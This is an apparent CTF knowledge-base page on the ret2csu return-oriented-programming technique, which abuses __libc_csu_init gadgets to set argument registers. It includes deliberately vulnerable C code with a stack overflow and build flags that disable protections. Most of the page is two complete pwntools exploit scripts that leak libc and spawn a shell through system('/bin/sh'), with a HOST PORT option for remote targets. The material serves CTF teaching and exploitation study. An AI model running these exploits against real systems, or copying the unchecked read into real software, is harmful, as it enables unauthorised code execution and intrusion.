---
title: "ret2csu - The __libc_csu_init Universal Gadget"
category: pwn
subcategory: rop
type: technique
tags: [ret2csu, rop, rop-chain, gadget, libc-csu-init, universal-gadget, rdx, x86-64, got, plt, nx, pie, write, read, mprotect, execve, pwntools, ropgadget, ropper, objdump]
difficulty: hard
summary: "No pop rdx in the binary? __libc_csu_init gives you rdx, rsi, edi and an indirect call from a GOT pointer, in two halves."
when_to_use:
  - "You need rdx (write length, read length, mprotect size, execve envp) and there is no pop rdx gadget"
  - "The binary is small, statically-gadget-poor, and dynamically linked against glibc"
  - "You must call write(1, got, 8) or read(0, bss, N) to stage a bigger payload"
  - "objdump shows a __libc_csu_init symbol (glibc, roughly pre-2.34 / gcc before the init-array rework)"
  - "You want a leak plus a second call in one chain without returning to main"
tools: [pwntools, ROPgadget, ropper, objdump, readelf, checksec, gdb, gef, pwndbg]
related: [rop-fundamentals, rop-ret2libc, rop-ret2dlresolve, rop-srop, rop-stack-pivot, rop-static-binary, rop-one-gadget, mitigation-modern-playbook]
---

## TL;DR

Every glibc-linked x86-64 binary built before the CSU rework contains `__libc_csu_init`, whose
epilogue is a six-register `pop` gadget and whose loop body moves `r13 -> rdx`, `r14 -> rsi`,
`r15d -> edi` then does `call [r12 + rbx*8]`. Together they give you the three System V argument
registers -- including the scarce `rdx` -- plus an indirect call through a pointer you choose.
The standard answer to "I need `rdx` and there is no `pop rdx ; ret`".

## Recognise it

- `ROPgadget --binary ./vuln | grep "pop rdx"` comes back empty.
- You need a third argument: `write(1, addr, len)`, `read(0, bss, len)`,
  `mprotect(page, len, 7)`, `execve(path, argv, envp)`.
- `nm ./vuln | grep csu` shows `__libc_csu_init`.
- The binary is `No PIE`, or you already have the PIE base.
- The overflow is long: one csu call costs ~14 qwords, so you need roughly 120+ bytes.

## Vulnerable source

```c
/* vuln.c - overflow, but deliberately no pop rdx gadget in reach */
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    read(0, buf, 0x200);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    write(1, "go\n", 3);
    vuln();
    return 0;
}
```

```sh
# Force the classic CSU epilogue: no PIE, no canary, dynamically linked.
gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c

# Confirm the gadget actually exists in what you built
nm ./vuln | grep csu
objdump -d -M intel ./vuln | grep -A 30 "<__libc_csu_init>:"
```

## Theory

### What __libc_csu_init looks like

```asm
; --- the "mov" half (call it CSU_CALL) ---------------------------------
0x400600:  mov    rdx, r13
0x400603:  mov    rsi, r14
0x400606:  mov    edi, r15d          ; NOTE: 32-bit! only the low half of r15
0x400609:  call   QWORD PTR [r12+rbx*8]
0x40060d:  add    rbx, 1
0x400611:  cmp    rbx, rbp
0x400614:  jne    0x400600           ; loop back if rbx != rbp

; --- the "pop" half (call it CSU_POP) ----------------------------------
0x400616:  add    rsp, 0x8           ; eats ONE extra stack slot
0x40061a:  pop    rbx
0x40061b:  pop    rbp
0x40061c:  pop    r12
0x40061e:  pop    r13
0x400620:  pop    r14
0x400622:  pop    r15
0x400624:  ret
```

You always enter at `CSU_POP` first to load the registers, and the `ret` at the end takes you to
whatever you put next -- which is `CSU_CALL`.

### The rbx = 0, rbp = 1 constraint

`call QWORD PTR [r12+rbx*8]` is an *indirect* call through memory. With `rbx = 0` the target is
simply `[r12]`, so `r12` must be a **pointer to a pointer to the function**, not the function
itself -- in practice `r12 = elf.got['write']`, or any GOT/`.data` slot holding the address.

After the call, `add rbx, 1` makes `rbx = 1`, and `cmp rbx, rbp ; jne` must **not** take the
branch, or the loop calls again through a different `r12+rbx*8`. So `rbp = 1`. That is the whole
constraint pair: `rbx = 0`, `rbp = 1`.

### Falling through into CSU_POP again

When the loop exits it falls straight into `add rsp, 8` then the six pops. So after your called
function returns, the chain automatically consumes **seven** qwords -- one eaten by `add rsp, 8`,
then `rbx, rbp, r12, r13, r14, r15` -- and only then `ret`s to the next address you supply.

That is also what makes **chaining several calls** easy: instead of padding those seven slots with
junk, refill the six registers for the next call and point the final `ret` back at `CSU_CALL`.

### The edi truncation gotcha

`mov edi, r15d` writes only the low 32 bits of `rdi` and zero-extends, so you can pass `0`, `1`,
`2`, file descriptors and small integers -- but never a 64-bit pointer. When argument one must be
a pointer (`system("/bin/sh")`, `execve("/bin/sh", ...)`), csu cannot deliver it. The standard
pattern is: use csu only for `rdx` (and `rsi`), then set `rdi` with an ordinary `pop rdi ; ret`
in a separate chain step, and call the target directly.

### The full layout for one call

```
offset padding
p64(CSU_POP)
p64(0)            -> rbx   (must be 0)
p64(1)            -> rbp   (must be 1)
p64(func_ptr)     -> r12   ADDRESS OF A SLOT holding the target, e.g. elf.got['write']
p64(arg3)         -> r13   becomes rdx
p64(arg2)         -> r14   becomes rsi
p64(arg1)         -> r15   becomes edi (low 32 bits only)
p64(CSU_CALL)
p64(0)            junk, eaten by "add rsp, 8"
p64(0)            rbx
p64(0)            rbp
p64(0)            r12
p64(0)            r13
p64(0)            r14
p64(0)            r15
p64(next_gadget)  where the chain continues
```

## Gadget shopping list

```sh
# locate both halves by disassembling the symbol - this is the authoritative source
objdump -d -M intel ./vuln | grep -A 32 "<__libc_csu_init>:"

# CSU_POP: the six-register pop, usually the last 7 instructions of the symbol
ROPgadget --binary ./vuln | grep -E "pop rbx ; pop rbp ; pop r12"

# CSU_CALL: the mov/call body
ROPgadget --binary ./vuln --only "mov|call" | grep "r12"
ropper --file ./vuln --search "mov rdx, r13"

# an ordinary pop rdi for the argument csu truncates, plus a slot holding a
# callable address (r12 points HERE, not at the function itself)
ROPgadget --binary ./vuln --only "pop|ret" | grep "pop rdi"
readelf -r ./vuln | grep -E "write|read|puts|alarm"
```

pwntools finds the pop half with
`ROP(elf).find_gadget(["pop rbx", "pop rbp", "pop r12", "pop r13", "pop r14", "pop r15", "ret"])`,
but there is no reliable way to derive the mov half from it: the distance between the two varies
per build. Disassemble and read both addresses.

## Attack

1. Confirm `__libc_csu_init` exists and write down both addresses from `objdump`.
2. Read the `mov` order in *your* binary -- some builds use `mov rdx, r15 ; mov rsi, r14 ;
   mov edi, r13d`. The wrong mapping puts your arguments in the wrong registers.
3. Pick `r12` = a GOT slot whose contents you want to call (`elf.got['write']` after `write`
   has run at least once, otherwise it still points at the PLT resolver stub).
4. Stage one: `write(1, elf.got['read'], 8)` using csu -- this needs `rdx = 8`, which is exactly
   why you are here. Parse the leak, compute the libc base.
5. Stage two (chained, no return to main): set `rdi` with `pop rdi ; ret`, point the chain at
   `system` or a `one_gadget`.
6. Alternatively: `read(0, bss, 0x200)` via csu to plant a long chain plus `/bin/sh` in `.bss`,
   then `leave ; ret` pivot into it. See `rop-stack-pivot`.

## Exploit

```python
#!/usr/bin/env python3
"""ret2csu on x86-64: use __libc_csu_init to control rdx, leak libc with
write(1, got.read, 8), then call system("/bin/sh").

Local: ./exploit.py    Remote: ./exploit.py HOST PORT
Build: gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "./libc.so.6"
OFFSET = 72

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"

# Read these two out of `objdump -d -M intel ./vuln`. Do NOT guess them.
CSU_POP = 0x004011BA     # add rsp,8 ; pop rbx ; pop rbp ; pop r12..r15 ; ret
CSU_CALL = 0x004011A0    # mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+20\nc\n")
    return process(BINARY)


def csu(func_ptr_slot, arg1, arg2, arg3, ret_to):
    """One __libc_csu_init call.

    func_ptr_slot : address of a QWORD that holds the function to call (a GOT slot)
    arg1 -> edi (low 32 bits only), arg2 -> rsi, arg3 -> rdx
    ret_to        : where the chain continues after the automatic 7-slot epilogue
    """
    chain = b""
    chain += p64(CSU_POP)
    chain += p64(0)               # rbx = 0  -> call [r12 + 0]
    chain += p64(1)               # rbp = 1  -> loop exits after exactly one call
    chain += p64(func_ptr_slot)   # r12
    chain += p64(arg3)            # r13 -> rdx
    chain += p64(arg2)            # r14 -> rsi
    chain += p64(arg1)            # r15 -> edi
    chain += p64(CSU_CALL)
    chain += p64(0) * 7           # add rsp,8 junk + six pops the epilogue performs
    chain += p64(ret_to)
    return chain


def main():
    io = start()
    libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else io.libc

    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address

    # --- stage one: write(1, got.read, 8) then back into main ---------------
    payload = b"A" * OFFSET
    payload += csu(elf.got["write"], 1, elf.got["read"], 8, elf.symbols["main"])
    io.send(payload.ljust(0x200, b"\x00"))

    leak = u64(io.recv(8))
    log.success("read@libc  = %#x", leak)
    libc.address = leak - libc.symbols["read"]
    log.success("libc base  = %#x", libc.address)
    if libc.address & 0xFFF:
        log.warning("base is not page aligned - wrong symbol or wrong libc")

    binsh = next(libc.search(b"/bin/sh\x00"))

    # --- stage two: system("/bin/sh") --------------------------------------
    # rdi must be a full 64-bit pointer, so csu cannot set it: use pop rdi.
    payload = b"B" * OFFSET
    payload += p64(ret)                       # movaps alignment
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(libc.symbols["system"])
    io.send(payload.ljust(0x200, b"\x00"))

    io.sendline(b"cat flag.txt; cat /flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

### Chaining two csu calls without returning to main

```python
#!/usr/bin/env python3
"""Two back-to-back __libc_csu_init calls in one payload:
  1) write(1, got.read, 8)   -- the leak
  2) read(0, bss, 0x100)     -- pull in a second-stage chain
then pivot into .bss. No return to main required.

Local: ./chain2.py    Remote: ./chain2.py HOST PORT
"""
import sys

from pwn import *

BINARY = "./vuln"
OFFSET = 72
CSU_POP = 0x004011BA
CSU_CALL = 0x004011A0

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def csu_head(func_ptr_slot, arg1, arg2, arg3):
    """The register-loading half plus the call. Leaves the 7-slot epilogue open."""
    return b"".join([
        p64(CSU_POP),
        p64(0), p64(1),
        p64(func_ptr_slot),
        p64(arg3), p64(arg2), p64(arg1),
        p64(CSU_CALL),
    ])


def csu_tail_refill(func_ptr_slot, arg1, arg2, arg3):
    """Instead of padding the epilogue with junk, use its six pops to load the
    NEXT call's registers, then ret straight back into CSU_CALL."""
    return b"".join([
        p64(0),                 # eaten by add rsp, 8
        p64(0), p64(1),         # rbx, rbp
        p64(func_ptr_slot),     # r12
        p64(arg3), p64(arg2), p64(arg1),   # r13, r14, r15
        p64(CSU_CALL),
    ])


def csu_tail_junk(ret_to):
    return b"".join([p64(0)] * 7 + [p64(ret_to)])


def main():
    io = start()
    bss = elf.bss(0x200)

    rop = ROP(elf)
    leave_ret = rop.find_gadget(["leave", "ret"])
    pivot = leave_ret.address if leave_ret else elf.symbols["main"]

    payload = b"A" * OFFSET
    payload += csu_head(elf.got["write"], 1, elf.got["read"], 8)
    payload += csu_tail_refill(elf.got["read"], 0, bss, 0x100)
    payload += csu_tail_junk(pivot)
    io.send(payload.ljust(0x200, b"\x00"))

    leak = u64(io.recv(8))
    log.success("read@libc = %#x", leak)

    # The second csu call is now blocking in read(0, bss, 0x100): feed it the
    # stage-two chain, which the leave;ret pivot will execute from .bss.
    stage2 = p64(bss) + p64(0xDEADBEEF)   # fake rbp + placeholder chain
    io.send(stage2.ljust(0x100, b"\x00"))

    io.interactive()


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Register mapping differs per build.** The classic is `rdx<-r13, rsi<-r14, edi<-r15d`; other
  gcc/glibc combinations emit `rdx<-r15, rsi<-r14, edi<-r13d`. Disassemble, do not assume.
- **r12 is a pointer to a pointer.** `r12 = elf.plt['write']` fails because the call dereferences
  it. Use `elf.got['write']`, or any writable slot you first populated.
- **Lazy binding.** With Partial RELRO, a GOT slot for a never-called function still holds the
  PLT+6 resolver stub. Calling through it works (it resolves, then jumps), but *leaking* it is
  useless -- leak a function the program already called.
- **edi truncation.** `mov edi, r15d` makes argument one 32-bit: perfect for an `fd`, useless for
  a pointer. Set `rdi` with a separate gadget when it must be a pointer.
- **Forgetting the 7-slot epilogue.** The most common bug: `add rsp, 8` plus six pops is exactly
  seven qwords before the chain resumes. And **rbp != 1** sends the loop around again to call
  `[r12+8]`, which is usually garbage.
- **__libc_csu_init is gone.** From roughly glibc 2.34 / recent gcc, the CSU init/fini objects
  were folded away and `__libc_csu_init` no longer exists. Options:
  - Look for the same *shape* elsewhere: `ROPgadget --binary ./vuln --only "pop|ret" | grep r12`
    and `ropper --file ./vuln --search "mov rdx"`. Newer startup code, `__libc_start_main`
    wrappers and static libc often still yield a multi-pop gadget.
  - Grep libc once you have a leak: `pop rdx ; pop rbx ; ret` and `mov rdx, ... ; ret` are
    plentiful there, so ret2libc leak first and a csu-free chain second usually wins.
  - **ret2dlresolve**: no leak and no csu needed, forge the relocation structures instead
    (`rop-ret2dlresolve`). **SROP**: one `syscall ; ret` plus a `sigreturn` frame sets *every*
    register at once, including `rdx` (`rop-srop`).
- **Static binaries** rarely need csu -- `ROPgadget --ropchain` finds `pop rdx` directly
  (`rop-static-binary`). With **PIE**, rebase both csu addresses via `elf.address` first.

## Tools

| Tool | Use |
|---|---|
| `objdump -d -M intel ./vuln` | Read both csu halves and their exact addresses -- mandatory |
| `nm ./vuln \| grep csu` | Does `__libc_csu_init` exist at all |
| `ROPgadget --binary ./vuln` | `grep "pop rbx ; pop rbp ; pop r12"` for the pop half |
| `ropper --file ./vuln --search "mov rdx, r13"` | The mov half, and substitutes on newer builds |
| `readelf -r ./vuln` | GOT slots suitable as `r12` |
| `pwntools ROP.find_gadget` | Programmatic lookup of the pop half and `pop rdi ; ret` |
| `gdb` + `gef` / `pwndbg` | Break at `CSU_CALL`, check `r12`, `x/gx $r12`, single-step the loop |
| `checksec` | PIE/RELRO decide whether addresses need rebasing |
